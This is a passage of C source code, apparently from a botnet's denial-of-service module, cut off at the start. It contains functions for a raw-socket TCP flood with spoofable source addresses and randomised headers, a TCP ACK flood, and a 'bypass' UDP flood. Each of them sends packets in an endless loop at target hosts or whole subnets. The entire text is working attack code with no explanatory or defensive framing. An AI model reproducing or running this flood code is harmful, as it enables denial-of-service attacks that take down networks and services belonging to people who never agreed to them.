            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;

            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_tcp_ack(struct arguments *args)
{
    DEBUG_PRINT("ACKPLAIN!\n");

    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK, TRUE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_SYN, FALSE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;

            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_udp_bypass(struct arguments *args)
{
    DEBUG_PRINT("BYPASS!\n");

    uint16_t size = 0;
    uint16_t port = 0;
    int i = 0;
    char *data;
    int *fds;

    for (i = 0; i < args->num_of_targets; i++)
    {
        DEBUG_PRINT("Target: %d.%d.%d.%d/%d\n", args->targets[i].host & 0xff, (args->targets[i].host >> 8) & 0xff, (args->targets[i].host >> 16) & 0xff, (args->targets[i].host >> 24) & 0xff, args->targets[i].netmask);
    }


    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if (!fds)
    {
        exit(1);
    }

    for(i = 0; i < args->num_of_targets; i++)
    {
        struct sockaddr_in bind_addr;
        struct sockaddr_in addr;

        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] == -1)
        {
            exit(1);
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = rand_new();
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = args->targets[i].netmask < 32 ? (htonl(ntohl(args->targets[i].host) + (((uint32_t)rand_new()) >> args->targets[i].netmask))) : args->targets[i].host;

        connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
    }

    int a = 0;

    while (TRUE)
    {
        for (i = 0; i < args->num_of_targets; i++)
        {
            size = 1024 + rand() % (1460 - 1024);
            port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 53 + rand() % (65535 - 53)); // The dport is random if it is not defined. If the dport is random all the time it changes.

            data = (char *)malloc(size);

            for (a = 0; a < size; a++) {
            data[a] = (char)(rand() & 0xFFFF);
            }

            send(fds[i], data, size, MSG_NOSIGNAL);
        }
    }
}
